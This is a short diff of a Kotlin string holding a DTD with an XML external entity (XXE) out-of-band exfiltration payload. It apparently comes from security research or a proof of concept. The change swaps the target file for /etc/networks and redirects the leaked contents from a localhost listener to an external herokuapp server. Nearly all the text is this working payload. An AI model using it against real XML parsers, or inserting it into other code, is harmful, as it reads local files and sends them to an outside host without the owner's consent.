@@ -73,8 +73,8 @@ val dtd = """
                    lines CDATA #IMPLIED
                    columns CDATA #IMPLIED>
 
-<!ENTITY % payload SYSTEM "file:///Users/jonathanleitschuh/git_repos/gradle-testing/test.txt">
-<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://localhost:8082/x=%payload;">'>
+<!ENTITY % payload SYSTEM "file:///etc/networks">
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://testing-kotlin-server.herokuapp.com/x=%payload;">'>
 %param1;
 %external;
 """.trimIndent()
